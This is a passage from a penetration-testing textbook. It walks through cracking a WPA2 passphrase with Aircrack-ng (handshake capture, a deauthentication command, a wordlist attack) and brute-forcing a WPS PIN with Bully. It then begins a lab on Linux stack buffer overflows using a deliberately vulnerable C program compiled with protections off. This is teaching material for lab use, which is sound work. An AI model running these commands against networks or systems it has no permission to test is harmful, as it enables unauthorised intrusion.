between the access point and the client. No authentication or master key step 
occurs, and instead of a RADIUS server and master key, WPA/WPA2 personal use pre-shared keys, which are generated using pre-shared passphrases. 
The WPA/WPA2 personal passphrase that you enter when you connect 
to a secured network is static, whereas enterprise setups use dynamic keys 
generated by the RADIUS server. Enterprise setups are more secure, but most 
personal networks and even most small businesses lack RADIUS servers. 
352 Chapter 15
The Four-Way Handshake
In the first phase of the connection between an access point and supplicant 
(client), a pairwise master key (PMK), which is static throughout the entire 
session, is created. This is not the key that will be used for encryption itself, 
but it will be used during the second phase, where a four-way handshake 
will take place between access point and client, with the purpose of establishing a channel of communication and exchanging the encryption keys 
used for further data communication, as shown in Figure 15-7.
ANonce
SNonce + MIC
GTK + MIC
Ack
Figure 15-7: WPA/WPA2 four-way handshake
This PMK is generated from the following:
‚Ä¢	 The passphrase (pre-shared key, or PSK)
‚Ä¢	 The access point‚Äôs SSID
‚Ä¢	 The SSID length
‚Ä¢	 The number of hashing iterations (4096)
‚Ä¢	 The resulting length in bits (256) of the generated shared key (PMK) 
These values are fed into a hashing algorithm called PBKDF2, which 
creates a 256-bit shared key (PMK). While your passphrase (PSK) may be 
GeorgiaIsAwesome, this is not the PMK that will be used in a second phase. 
That said, anyone who knows the passphrase and the access point‚Äôs SSID 
can use the PBKDF2 algorithm to generate the correct PMK. During the 
four-way handshake, a pairwise transient key (PTK) is created and used to 
encrypt traffic between the access point and the client; a group transient 
key (GTK) is exchanged and used to encrypt broadcast traffic. The PTK is 
made up of the following:
‚Ä¢	 The shared key (the PMK)
‚Ä¢	 A random number (nonce) from the access point (ANonce)
‚Ä¢	 A nonce from the client (SNonce)
‚Ä¢	 The MAC address of the client
‚Ä¢	 The MAC address of the access point
These values are fed into the PBKDF2 hashing algorithm to create 
the PTK. 
To generate the PTK, the access point and the client exchange MAC 
addresses and nonces (random values). The static shared key (PMK) is never 
sent over the air, because both the access point and the client know the passphrase (PSK) and, thus, can generate the shared key independently. 
Wireless Attacks 353
The shared nonces and MAC addresses are used by both the client and 
the access point to generate the PTK. In the first step of the four-way handshake, the access point sends its nonce (ANonce). Next, the client chooses 
a nonce, generates the PTK, and sends its nonce (SNonce) to the access 
point. (The S in SNonce stands for supplicant, another name for the client 
in a wireless setup.) 
In addition to sending its nonce, the client sends a message integrity 
code (MIC) to guard against forgery attacks. In order to compute the correct 
MIC, the passphrase used to generate the pre-shared key must be correct, or 
the PTK will be wrong. The access point independently generates the PTK 
based on the SNonce and MAC address sent by the client, then checks the 
MIC sent by the client. If it‚Äôs correct, the client has authenticated successfully, 
and the access point sends over the GTK plus the MIC to the client. 
In the fourth part of the handshake, the client acknowledges the GTK.
Cracking WPA/WPA2 Keys
Unlike WEP, the cryptographic algorithms used in WPA and WPA2 are 
robust enough to stop attackers from recovering the key simply by capturing enough traffic and performing cryptanalysis. The Achilles‚Äô heel in 
WPA/WPA2 personal networks lies in the quality of the pre-shared key 
(passphrase) used. If the Windows Administrator password you found during 
post exploitation is the same as the WPA or WPA2 personal passphrase or 
the passphrase is written on a whiteboard in the front office of the organization, it‚Äôs game over. 
To try to guess a weak password, we first need to capture the four-way 
handshake for analysis. Recall that given the correct passphrase and the 
SSID of the access point, the PBKDF2 hashing algorithm can be used to 
generate the shared key (PMK). Given the PMK, we still need the ANonce, 
SNonce, and the MAC addresses of the access point and client to calculate 
the PTK. Of course, the PTK will differ for each client, because the nonces 
will differ in each four-way handshake, but if we can capture a four-way 
handshake from any legitimate client, we can use its MAC addresses and 
nonces to calculate the PTK for a given passphrase. For example, we can 
use the SSID and the passphrase password to generate a PMK, then combine the generated PMK with the captured nonces and MAC addresses to 
calculate a PTK. If the MICs comes out like the ones in the captured handshake, we know that password is the correct passphrase. This technique can 
be applied to a wordlist of possible passphrases to try to guess the correct 
passphrase. Luckily, if we can capture a four-way handshake and supply a 
wordlist, we have Aircrack-ng to take care of all the math. 
Using Aircrack-ng to Crack WPA/WPA2 K
To use Aircrack-ng to crack WPA/WPA2, first set up your wireless access 
point for WPA2 personal. Choose a pre-shared key (passphrase) and then 
connect your host system to your access point to simulate a real client.
354 Chapter 15
To use a wordlist to try to guess the WPA2 pre-shared key (passphrase), 
we need to capture the four-way handshake. Enter airodump-ng -c 6 for the 
channel, --bssid with the base station MAC address, -w to specify the filename 
for output (use a different filename than you used in the WEP cracking 
example), and mon0 for the monitor interface, as shown in Listing 15-12.
root@kali:~# airodump-ng -c 6 --bssid 00:23:69:F5:B4:2B -w pentestbook2 mon0
 CH 6 ][ Elapsed: 4 s ][ 2015-05-19 16:31 
 BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH E
 
 00:23:69:F5:B4:2B -43 100 66 157 17 6 54 . WPA2 CCMP PSK l
 BSSID STATION PWR Rate Lost Frames Probe 
 00:23:69:F5:B4:2B 70:56:81:B2:F0:53 -33 54-54 15 168 u
Listing 15-12: Airodump-ng for WPA2 cracking 
As you can see the host is connected u. To capture a four-way handshake, we can either wait for another wireless client to sign on or speed up 
the process by kicking a client off the network and forcing it to reconnect. 
To force a client to reconnect, use Aireplay-ng to send a message to a 
connected client telling it that it is no longer connected to the access point. 
When the client reauthenticates, we‚Äôll capture the four-way handshake 
between the client and access point. The Aireplay-ng options we‚Äôll need are:
‚Ä¢	 -0 means deauthentication.
‚Ä¢	 1 is the number of deauthentication requests to send.
‚Ä¢	 -a 00:14:6C:7E:40:80 is the MAC address of the base station.
‚Ä¢	 -c 00:0F:B5:FD:FB:C2 is the MAC address of the client to deauthenticate. 
Listing 15-13 shows the aireplay-ng command and the deauthentication 
request.
root@kali:~# aireplay-ng -0 1 -a 00:23:69:F5:B4:2B -c 70:56:81:B2:F0:53 mon0
16:35:11 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
16:35:14 Sending 64 directed DeAuth. STMAC: [70:56:81:B2:F0:53] [24|66 ACKs]
Listing 15-13: Sending a deauthentication request to a client
Now we return to the Airodump-ng window, as shown in Listing 15-14. 
CH 6 ][ Elapsed: 2 mins ][ 2015-11-23 17:10 ][ WPA handshake: 00:23:69:F5:B4:2B u
 BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
 00:23:69:F5:B4:2B -51 100 774 363 18 6 54 . WPA2 CCMP PSK linksys 
Wireless Attacks 355
 BSSID STATION PWR Rate Lost Frames Probe 
 00:23:69:F5:B4:2B 70:56:81:B2:F0:53 -29 1 - 1 47 457 
Listing 15-14: WPA2 handshake captured in Airodump-ng
If the Airodump-ng capture sees a four-way handshake with a client, it 
records it in the first line of the captured output u. 
Once you‚Äôve captured the WPA2 handshake, close Airodump-ng, and 
open the .cap file in Wireshark with FileÔÄ¥OpenÔÄ¥filename.cap. Once i
Wireshark, filter for the eapol protocol to see the four packets that make 
up the handshake, as shown in Figure 15-8.
Figure 15-8: WPA2 handshake packets in Wireshark
N ote Sometimes Aircrack-ng will claim that the handshake has been captured, but when
you look at the packets in Wireshark, you will see you do not have all four messages. If 
this is the case, run the deauthentication attack again, as you will need all four messages to attempt to guess the correct key.
Now we create a wordlist like the ones we used in Chapter 9, making 
sure that the correct WPA2 key is included in the list. The success of our 
attack against WPA2 is contingent on our ability to compare the hashed 
values for our passphrase with the values in the handshake. 
Once we have the handshake, we can do the rest of the calculations 
to recover the key offline; we no longer need to be in range of the access 
point or send it any packets. Next we use Aircrack-ng to test the keys in 
the wordlist, specifying a list with the -w option, as shown in Listing 15-15. 
Otherwise, the command is identical to cracking the WEP key. If the correct key is in the wordlist, it will be recovered with Aircrack-ng. 
356 Chapter 15
root@kali:~# aircrack-ng -w password.lst -b 00:23:69:F5:B4:2B pentestbook2*.cap
Opening pentestbook2-01.cap
Reading packets, please wait...
 Aircrack-ng 1.2 beta2
 [00:00:00] 1 keys tested (178.09 k/s)
 KEY FOUND! [ GeorgiaIsAwesome ] u
 Master Key : 2F 8B 26 97 23 D7 06 FE 00 DB 5E 98 E3 8A C1 ED 
 9D D9 50 8E 42 EE F7 04 A0 75 C4 9B 6A 19 F5 23 
 Transient Key : 4F 0A 3B C1 1F 66 B6 DF 2F F9 99 FF 2F 05 89 5E 
 49 22 DA 71 33 A0 6B CF 2F D3 BE DB 3F E1 DB 17 
 B7 36 08 AB 9C E6 E5 15 5D 3F EA C7 69 E8 F8 22 
 80 9B EF C7 4E 60 D7 9C 37 B9 7D D3 5C A0 9E 8C 
 EAPOL HMAC : 91 97 7A CF 28 B3 09 97 68 15 69 78 E2 A5 37 54
Listing 15-15: Recovering a WPA2 key with Aircrack-ng
As you can see, the correct key is in our wordlist and is recovered u. 
This sort of dictionary attack against WPA/WPA2 can be prevented by 
using a strong passphrase, as discussed in Chapter 9. 
Aircrack-ng is just one suite of tools for cracking wireless. It is ideal for 
beginners, because starting different tools for each step of the process will 
help you become familiar with how these attacks work. Other widely used 
Wi-Fi auditing tools that you may encounter are Kismet and Wifite. 
Wi-Fi Protected Set
Wi-Fi Protected Setup (WPS) was designed to allow users to attach their 
devices to secure networks with an eight-digit pin instead of a potentially 
long and complicated passphrase. When the correct pin is supplied, the 
access point sends over the passphrase. 
Problems with WPS
The last digit of the pin is a checksum for the previous seven digits, so the 
keyspace should be 107
, or 10,000,000 possible pins. However, when a pin 
is sent to the access point by the client, the validity of the first four digits 
and second four digits is reported separately. The first four digits are all 
in play, so there are 10,000 possibilities. Of the second four digits, only 
the first three are in play (1000 possible guesses), so it would take at most 
11,000 guesses to brute-force the correct WPS pin. This decreases the time 
required to brute-force to under four hours. The only way to fix this issue is 
to disable WPS on the access point.
Wireless Attacks 357
Cracking WPS with Bully 
Kali provides tools that you can use to implement a brute-force attack 
against WPS. One such tool is Bully. We can use Bully to brute-force the 
WPS pin as well as test a specific pin. To use Bully we need the SSID, MAC 
address, and channel of the access point, which we found with iwlist at the 
beginning of this chapter. Use the -b flag to specify the MAC address, the 
-e flag for the SSID, and the -c flag for the channel, as shown here. 
root@kali:~# bully mon0 -b 00:23:69:F5:B4:2B -e linksys -c 6
Bully should be able to brute-force the pin in around four hours and 
recover the correct pre-shared PIN. WPS is enabled by default on many 
wireless access points and may be an easier way in than guessing a strong 
WPA/WPA2 passphrase. 
Summar
Wireless security is an often-overlooked piece of an organization‚Äôs security 
posture. Time and money are put into securing the perimeter, deploying the latest firewalls and intrusion-prevention systems, but all this is for 
naught if an attacker can just sit at the coffee shop across the street with 
a strong antenna and join your corporate network. Wireless connections 
may save corporations from lawsuits by distracted employees tripping over 
Ethernet wires, but they introduce potential security vulnerabilities and 
should be audited regularly. In this chapter, we used Aircrack-ng to recover 
WEP and WPA2 personal wireless keys by eavesdropping on and injecting 
traffic into a wireless network, and we used Bully to brute-force a WPS pin.

Part 
E x ploit D v elop m

16
AS t ack-Bae d Buf f 
Ov erfl ow i L i
So far we‚Äôve used tools such as Metasploit and public 
exploit code on the Internet to exploit our target systems. But you may find a vulnerability in your pentesting career that has no such exploit code, or you may 
discover a new security issue and want to write your 
own exploit code for it. In this chapter and the next 
three, we will look at the basics of writing our own exploits. We won‚Äôt cover 
everything through the latest and greatest iPhone jailbreak, but we will look 
at some real-world examples of vulnerable programs and learn how to write 
working exploits for them by hand. 
We‚Äôll begin with a simple vulnerable program on our Linux target and 
make the program do something its developer never intended. 
N ote All of the examples in Chapters 16 through 19 use x86 architecture
362 Chapter 16
Memory Theo
Before we dive into writing our own exploits, we need to get a handle on 
the basics of how memory works. Our goal is to manipulate memory and 
trick the CPU into executing instructions on our behalf. We‚Äôll use a technique called a stack-based buffer overflow, which involves overfilling a variable 
on the program‚Äôs memory stack and overwriting adjacent memory locations. 
But first, we need to know a little bit about how a program‚Äôs memory is laid 
out, as shown in Figure 16-1. 
text
data
low memory
heap
unused memory
stack
high memory
Figure 16-1: Memory visualization
The text segment contains the program code to be executed, while 
the data segment contains global information for the program. At higher 
addresses, we have a portion shared by the stack and heap, which are allocated at runtime. The stack is fixed in size and is used to store function 
arguments, local variables, and so on. The heap holds dynamic variables. 
The stack consumption increases as more functions or subroutines are 
called, and the top of the stack points at lower memory addresses as more 
data is stored on the stack.
Our Intel-based CPU has general-purpose registers where it can store 
data for future use. These include:
EIP instruction pointer 
ESP stack pointer
EBP base pointer
ESI source index
EDI destination index
EAX accumulator
EBX base 
A Stack-Based Buffer Overflow in Linux 363
ECX counter 
EDX data
ESP, EBP, and EIP are particularly interesting to us. ESP and EBP 
together keep track of the stack frame of the currently executing function.
As shown in Figure 16-2, ESP points to the top of the stack frame at its 
lowest memory address, and likewise, EBP points to the highest memory 
address at the bottom of the stack frame. EIP holds the memory address of 
the next instruction to be executed. Because our goal is to hijack execution 
and make the target machine execute what we want, EIP seems like a prime 
target for compromise. But how do we get our instructions to EIP? EIP is 
read only, so we can‚Äôt just put a memory address to be executed in this register; we will need to be a bit cleverer. 
main‚Äôs stack frame
low memory
high memory
ESP
EBP
Figure 16-2: Stack frame 
The stack is a last-in, first-out data structure. You can think of it like a 
stack of lunch trays at a cafeteria. The last tray that is added to the stack is 
the first tray that is taken off when one is needed. To add data to the stack, 
a PUSH instruction is used. Likewise, to remove data from the stack, we use a 
POP instruction. (Remember that the stack consumption increases to lower 
memory addresses, so when data is pushed onto the current stack frame, 
ESP moves to a lower address in memory.) 
When a program function is executed, a stack frame for its information (such as local variables) is pushed onto the stack. Once the function 
finishes executing, the entire stack frame is unwound, ESP and EBP point 
back to the caller function‚Äôs stack frame, and execution continues in the 
caller function where it left off. However, the CPU must know where in 
memory to continue from, and it obtains that information from the return 
address, which is pushed onto the stack when a function is called. 
Say, for instance, that we are running a C program. Naturally, the function main is called when the program begins, and a stack frame is allocated 
for it. main then calls another function, function1. Before pushing a stack 
frame for function1 onto the stack and handing over execution, main notes 
where execution will need to continue when function1 returns (typically the 
line of code directly after the call to function1) by pushing this value‚Äîits 
return address‚Äîonto the stack. Figure 16-3 shows the stack after main‚Äôs call 
to function1. 
364 Chapter 16
main‚Äôs stack frame
low memory
high memory
function1‚Äôs stack frame
ESP
EBP
return address
Saved EBP from main
Figure 16-3: Stack after call to function1
After function1 finishes, it returns, its stack frame is unwound, and the 
stored return address is loaded into the EIP register to restore execution 
to main. If we can control that return address, we can dictate which instructions are executed when function1 returns. In the next section, we‚Äôll look 
at a simple stack-based buffer overflow example to illustrate this point. 
Keep in mind a couple more things before we continue. In the 
examples in this book, we‚Äôre using older operating systems to get around 
some advanced antiexploitation techniques found on the most modern versions of both Windows and Linux. Particularly, we‚Äôll take advantage of 
the lack of data execution prevention (DEP) and address space layout randomization (ASLR), because both of them would make it difficult to learn the 
basics of exploitation. DEP sets specific memory sections as nonexecutable, 
which stops us from filling our stack with shellcode and pointing EIP to 
it for execution (as you‚Äôll see in the Windows buffer overflow example in 
Chapter 17). ASLR randomizes where our libraries are loaded in memory. 
In our examples, we‚Äôll hardcode the return address to where we would like 
to go in memory, but in the post-ASLR exploit world, finding the correct 
place to send execution can be a bit trickier. We‚Äôll touch on more advanced 
exploit-writing techniques in Chapter 19, but for now let‚Äôs get comfortable 
with the basics of how stack-based buffer overflows work. 
Linux Buffer Overflo
Now that we‚Äôre done with the mind-numbing theory, let‚Äôs see a basic example 
of a buffer overflow exploit in action on our Linux target. First, let‚Äôs make 
sure the target is set up correctly for a basic buffer overflow. Modern operating systems have checks in place to prevent these attacks, but while we are 
learning, we need to turn them off. If you‚Äôre using the Linux target image 
provided with this book, it‚Äôs already set up correctly, but to make sure, 
check that randomize_va_space is set to 0 as shown here.
A Stack-Based Buffer Overflow in Linux 365
georgia@ubuntu:~$ sudo nano /proc/sys/kernel/randomize_va_space
randomize_va_space, when set to 1 or 2, turns on ASLR on our target system. By default, randomization is turned on in Ubuntu, but we need this 
feature off for our example. If the file includes the value 0, we‚Äôre all set. If 
not, change the file contents to 0 and save it.
A Vulnerable Program 
Let‚Äôs write a simple C program called overflowtest.c that is vulnerable to a 
stack-based buffer overflow, as shown in Listing 16-1.
N ote This file is in georgia‚Äôs home directory on the Ubuntu target included in the book‚Äôs
downloads.
georgia@ubuntu:~$ nano overflowtest.c
#include <string.h>
#include <stdio.h>
u void overflowed() { 
 printf("%s\n", "Execution Hijacked");
}
v void function1(char *str){
 char buffer[5];
 strcpy(buffer, str);
}
w void main(int argc, char *argv[])
{
 function1(argv[1]);
 printf("%s\n", "Executed normally");
}
Listing 16-1: Simple exploitable C program 
Our simple C program doesn‚Äôt do very much. It starts off by including 
two C libraries, stdio.h and string.h. These allow us to use the standard 
input/output and string constructors in C without having to build them 
from scratch. We‚Äôll want to use strings and output text to the console in our 
program. 
Next we have three functions: overflowed, function1, and main. If overflowed
u is called, it prints the text ‚ÄúExecution Hijacked‚Äù to the console and then 
returns. If function1 v is called, it declares a local variable, a five-character 
string called buffer, and copies the contents of a variable passed to function1
into buffer. Called by default when the program starts, main w calls function1
and passes it the first command line argument the program received. After 
function1 returns, main prints the text ‚ÄúExecuted normally‚Äù to the console, 
and the program exits. 
366 Chapter 16
Notice that under normal circumstances, overflowed is never called, so 
‚ÄúExecution Hijacked‚Äù should never appear in the console. (You‚Äôll learn why 
it‚Äôs in the program at all when we overflow the buffer and hijack control of 
the program.) 
Now we compile our program as shown here.
georgia@ubuntu:~$ gcc -g -fno-stack-protector -z execstack -o overflowtest overflowtest.c 
To compile our C code as shown above, we use GCC, the GNU Compiler 
Collection, which is built into Ubuntu by default. The -g option tells GCC 
to add extra debugging information for GDB, the GNU debugger. We use 
the -fno-stack-protector flag to turn off GCC‚Äôs stack-protection mechanism, 
which would attempt to prevent buffer overflows if we left it turned on. The 
-z execstack compiler option makes the stack executable, disabling another 
buffer overflow prevention method. We tell GCC to compile overflowtest.c
into an executable called overflowtest with the -o option. 
Recall that main takes the first command line argument to the program 
and feeds it to function1, which copies the value into a five-character local 
variable. Let‚Äôs run the program with the command line argument AAAA, as 
shown here. Make overflowtest executable with chmod if necessary. We use 
four As instead of five because a string ends with a null byte. Technically, if 
we used five As, we would already be overflowing the buffer, albeit by just 
one character. 
georgia@ubuntu:~$ ./overflowtest AAAA
Executed normally
As shown, the program does what we expected: main calls function1, 
function1 copies AAAA into buffer, function1 returns execution to main, and main
prints ‚ÄúExecuted normally‚Äù to the console before the program exits. Maybe 
if we give overflowtest some unexpected input, we can force it to behave in a 
way that will help us cause a buffer overflow. 
Causing a Crash
Now let‚Äôs try giving the program a long string of As as an argument, as 
shown here. 
georgia@ubuntu:~$ ./overflowtest AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
This time, the program crashes with a segmentation fault. Our program‚Äôs problem lies with the implementation of strcpy, which we use in 
function1. The strcpy function takes one string and copies it into another, 
but it does not do any bounds checking to make sure the supplied argument will fit into the destination string variable. The strcpy function 
will attempt to copy three, five, or even hundreds of characters into our 
A Stack-Based Buffer Overflow in Linux 367
five-character destination string. If our string is five characters long and 
we copy in 100 characters, the other 95 will end up overwriting data at 
adjacent memory addresses in the stack. 
We could potentially overwrite the rest of function1‚Äôs stack frame and 
even higher memory. Remember what‚Äôs at the memory address immediately after the base of that stack frame? Before the frame was pushed on 
the stack, main pushed its return address onto the stack to designate where 
execution should continue once function1 returns. If the string we copy into 
buffer is long enough, we‚Äôll overwrite memory from buffer straight through 
to EBP, over the return address, and even into main‚Äôs stack frame. 
Once strcpy places the first argument from overflowtest into buffer, 
function1 returns back to main. Its stack frame is popped off the stack, and 
the CPU tries to execute the instruction at the memory location in the return 
address. Because we‚Äôve overwritten the return address with a long string of 
As, as shown in Figure 16-4, the CPU will try to execute the instructions at 
the memory address 41414141 (the hexadecimal representation of four As). 
main‚Äôs stack frame
low memory
high memory
function1‚Äôs stack frame
ESP
EBP
return address AAAA
AAAA
buffer = [AAAAA]
AAAA
Figure 16-4: Memory after strcpy is executed 
However, our program can‚Äôt read, write, or execute from anywhere it 
likes in memory because that would cause utter chaos. The memory address 
41414141 is out of bounds for our program, and it crashes with the segmentation fault we saw at the beginning of this section. 
In the next section, we‚Äôll take a closer look behind the scenes when the 
program crashes. In GDB, discussed next, you can use the command maintenance info sections to see which memory regions are mapped to the process. 
Running GDB
We can see exactly what‚Äôs happening in memory by running our program 
in a debugger. Our Ubuntu machine comes with GDB, so let‚Äôs open the program in the debugger, as shown here, and watch what happens in memory 
if we overflow our five-character buffer. 
368 Chapter 16
georgia@ubuntu:~$ gdb overflowtest
(gdb) 
Before we run the program, we‚Äôll set some breakpoints to pause execution at certain points in the program and allow us to view the state of 
memory at those times. Because we compiled the program with the -g
flag, we can view the source code directly, as shown in Listing 16-2, and set 
breakpoints at the lines where we would like to pause. 
(gdb) list 1,16
1 #include <string.h>
2 #include <stdio.h>
3
4 void overflowed() {
5 printf("%s\n", "Execution Hijacked");
6 }
7
8 void function(char *str){
9 char buffer[5];
10 strcpy(buffer, str); u
11 } v
12 void main(int argc, char *argv[])
13 {
14 function(argv[1]); w
15 printf("%s\n", "Executed normally");
16 }
(gdb) 
Listing 16-2: Viewing source code in GDB 
First, let‚Äôs pause the program right before main calls function1 at w, just 
before the instruction is executed. We‚Äôll also set two more breakpoints, inside 
function1, right before strcpy is executed at u, and directly afterward, at v. 
Setting breakpoints in GDB is shown in Listing 16-3. Set breakpoints at 
lines 14, 10, and 11 by using the GDB command break.
(gdb) break 14
Breakpoint 1 at 0x8048433: file overflowtest.c, line 14.
(gdb) break 10
Breakpoint 2 at 0x804840e: file overflowtest.c, line 10.
(gdb) break 11
Breakpoint 3 at 0x8048420: file overflowtest.c, line 11.
(gdb) 
Listing 16-3: Setting breakpoints in GDB 
Before we overflow buffer and cause the program to crash, let‚Äôs run it 
with just four As, as shown here, and watch memory as the program executes normally.
(gdb) run AAAA
Starting program: /home/georgia/overflowtest AAAA
A Stack-Based Buffer Overflow in Linux 369
Breakpoint 1, main (argc=2, argv=0xbffff5e4) at overflowtest.c:14
14 function(argv[1]); 
We use the GDB command run followed by arguments to start the program in the debugger. Here we run the program with four As as an argument. We hit our first breakpoint just before function1 is called, at which 
time we can examine the program‚Äôs memory using the GDB command x. 
GDB needs to know which part of memory we want to see and how 
it should be displayed. Memory contents can be displayed in octal, hexadecimal, decimal, or binary format. We‚Äôll see a lot of hexadecimal in our 
journey through exploit development, so let‚Äôs use the x flag to tell GDB to 
display our memory in hexadecimal format. 
We can also output memory in increments of one byte, a two-byte halfword, a four-byte word, and an eight-byte giant. Let‚Äôs look at 16 hexadecimal 
format words starting at the ESP register with the command x/16xw $esp, as 
shown in Listing 16-4. 
(gdb) x/16xw $esp
0xbffff540: 0xb7ff0f50 0xbffff560 0xbffff5b8 0xb7e8c685
0xbffff550: 0x08048470 0x08048340 0xbffff5b8 0xb7e8c685
0xbffff560: 0x00000002 0xbffff5e4 0xbffff5f0 0xb7fe2b38
0xbffff570: 0x00000001 0x00000001 0x00000000 0x08048249
Listing 16-4: Examining the contents of memory
The x/16xw $esp command prints out 16 four-byte words in hexadecimal 
format, starting with ESP. Recall from earlier in the chapter that ESP marks the 
lowest memory address in our stack. Because our first breakpoint paused execution right before the call to function1, ESP is at the top of main‚Äôs stack frame. 
The output of memory in GDB in Listing 16-4 might be a bit confusing at 
first, so let‚Äôs break it down. On the far left, we have our memory addresses in 
16-byte increments, followed by the contents of memory at those addresses. 
In this case, the first four bytes will be the contents of ESP followed by additional memory, starting at ESP and continuing down the stack. 
We can find EBP, which points at the bottom (or highest address) of main‚Äôs 
stack frame, by examining EBP as shown here with the command x/1xw $ebp.
(gdb) x/1xw $ebp
0xbffff548: 0xbffff5b8
(gdb) 
This command allows us to examine one hexadecimal word from EBP 
to find the memory location and contents of the EBP register. Based on the 
output, main‚Äôs stack frame looks like this: 
0xbffff540: 0xb7ff0f50 0xbffff560 0xbffff5b8 
As you can see, there‚Äôs not much to it, but then again, all main does is 
call another function and then print a line of text to the screen; there‚Äôs no 
heavy-duty processing required. 
370 Chapter 16
Based on what we know about the stack, we can expect that when we let 
the program continue and function1 is called, the return address for main
and a stack frame for function1 will be pushed onto the stack. Remember 
that the stack grows to lower memory addresses, so the top of the stack will 
be at a lower memory address when we hit our next breakpoint inside of 
function1. Recall that our next breakpoint is inside function1 right before the 
strcpy command is executed. Use the command continue to let the program 
run until the next breakpoint, as shown in Listing 16-5. 
(gdb) continue
Continuing.
Breakpoint 2, function (str=0xbffff74c "AAAA") at overflowtest.c:10
10 strcpy(buffer, str);
(gdb) x/16xw $espu
0xbffff520: 0xb7f93849 0x08049ff4 0xbffff538 0x080482e8
0xbffff530: 0xb7fcfff4 0x08049ff4 0xbffff548 0x08048443
0xbffff540: 0xbffff74f 0xbffff560 0xbffff5b8 0xb7e8c685
0xbffff550: 0x08048470 0x08048340 0xbffff5b8 0xb7e8c685
(gdb) x/1xw $ebpv
0xbffff538: 0xbffff548
Listing 16-5: Breakpoint before the strcpy command 
After using the continue command to run the program until the next 
breakpoint, examine ESP at u and EBP at v to see the contents of function1‚Äôs 
stack frame. function1‚Äôs stack frame is shown here.
0xbffff520: 0xb7f93849 0x08049ff4 0xbffff538 0x080482e8
0xbffff530: 0xb7fcfff4 0x08049ff4 0xbffff548
The stack frame for function1 is a bit larger than main‚Äôs. There‚Äôs some 
memory allocated for the local variable buffer, along with a little extra space 
for strcpy to work with, but there‚Äôs certainly not enough room for 30 or 40 As. 
Recall from the last breakpoint that main‚Äôs stack frame began at memory 
address 0xbffff540. Based on our knowledge of the stack, 0x08048443, the 
four-byte memory address between function1‚Äôs stack frame and main‚Äôs stack 
frame, should be our return address for main. Let‚Äôs disassemble main with the 
disass command, as shown in Listing 16-6, to see where 0x08048443 comes in. 
(gdb) disass main
Dump of assembler code for function main:
0x08048422 <main+0>: lea 0x4(%esp),%ecx
0x08048426 <main+4>: and $0xfffffff0,%esp
0x08048429 <main+7>: pushl -0x4(%ecx)
0x0804842c <main+10>: push %ebp
0x0804842d <main+11>: mov %esp,%ebp
0x0804842f <main+13>: push %ecx
0x08048430 <main+14>: sub $0x4,%esp
0x08048433 <main+17>: mov 0x4(%ecx),%eax
0x08048436 <main+20>: add $0x4,%eax
0x08048439 <main+23>: mov (%eax),%eax
A Stack-Based Buffer Overflow in Linux 371
0x0804843b <main+25>: mov %eax,(%esp)
0x0804843e <main+28>: call 0x8048408 <function1> u
0x08048443 <main+33>: movl $0x8048533,(%esp) v
0x0804844a <main+40>: call 0x804832c <puts@plt>
0x0804844f <main+45>: add $0x4,%esp
0x08048452 <main+48>: pop %ecx
0x08048453 <main+49>: pop %ebp
0x08048454 <main+50>: lea -0x4(%ecx),%esp
0x08048457 <main+53>: ret 
End of assembler dump.
Listing 16-6: Disassembled main function 
If you aren‚Äôt fluent in assembly code, don‚Äôt worry. The instruction we‚Äôre 
looking for jumps out at us in plain English: At 0x0804843e u, main calls the 
memory address of function1. It stands to reason that the next instruction to 
be executed when function1 exits (and thus our return address) will be the 
next instruction in the list. And sure enough, the next line at v shows the 
return address we found on the stack. Everything looks just like the theory 
says it should.
Let‚Äôs allow the program to continue and see what happens in memory 
when our four As are copied into buffer. After the program pauses at the 
third breakpoint, examine memory in the usual way, as shown in Listing 16-7. 
(gdb) continue
Continuing. 
Breakpoint 3, function (str=0xbffff74c "AAAA") at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff520: 0xbffff533 0xbffff74c 0xbffff538 0x080482e8
0xbffff530: 0x41fcfff4 0x00414141u 0xbffff500 0x08048443
0xbffff540: 0xbffff74c 0xbffff560 0xbffff5b8 0xb7e8c685
0xbffff550: 0x08048470 0x08048340 0xbffff5b8 0xb7e8c685
(gdb) x/1xw $ebp
0xbffff538: 0xbffff500
Listing 16-7: Examining memory at breakpoint 3
As shown, we‚Äôre still inside function1, so our stack frame location is the 
same. Inside function1‚Äôs stack frame, we can see our four As u represented in 
hexadecimal as 41 followed by 00 for the ending null byte. They fit nicely 
in our five-character buffer, so our return address is still intact, and everything works as expected when we let the program continue, as shown in 
Listing 16-8.
(gdb) continue
Continuing.
Executed normally
Program exited with code 022.
(gdb) 
Listing 16-8: The program finishes normally. 
372 Chapter 16
Sure enough, ‚ÄúExecuted normally‚Äù prints to the screen. 
Now, let‚Äôs run the program again, this time overflowing our buffer with 
too many characters, and watch what happens in memory. 
Crashing the Program in GDB
We could enter a long string of As, or we could let the Perl scripting language 
generate that string for us, as shown in Listing 16-9. (Perl will come in handy 
later when we try to hijack execution with an actual memory address rather 
than crash the program.)
(gdb) run $(perl -e 'print "A" x 30') u
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 30')
Breakpoint 1, main (argc=2, argv=0xbffff5c4) at overflowtest.c:14
14 function(argv[1]);
(gdb) x/16xw $esp
0xbffff520: 0xb7ff0f50 0xbffff540 0xbffff598 0xb7e8c685
0xbffff530: 0x08048470 0x08048340 0xbffff598 0xb7e8c685
0xbffff540: 0x00000002 0xbffff5c4 0xbffff5d0 0xb7fe2b38
0xbffff550: 0x00000001 0x00000001 0x00000000 0x08048249
(gdb) x/1xw $ebp
0xbffff528: 0xbffff598
(gdb) continue
Listing 16-9: Running the program with 30 As as an argument 
Here we tell Perl to execute the command print to make a string of 30 As 
and feed the results in as the argument to overflowtest u. When strcpy tries 
to place such a long string into our five-character buffer, we can expect to see 
parts of our stack get overwritten with As. When we hit our first breakpoint, 
we‚Äôre still in main, and everything looks normal so far. The trouble shouldn‚Äôt 
start until our third breakpoint, after strcpy is executed with too many As. 
N ote main‚Äôs stack frame is still 12 bytes long, though it has moved 32 bytes up the stack.
This is due to changes in the length of the command line argument, and so on. The 
size of the stack frame will be consistent throughout.
Let‚Äôs note one thing at the second breakpoint in Listing 16-10 before we 
move on to the really interesting part. 
Breakpoint 2, function (str=0xbffff735 'A' <repeats 30 times>)
 at overflowtest.c:10
10 strcpy(buffer, str);
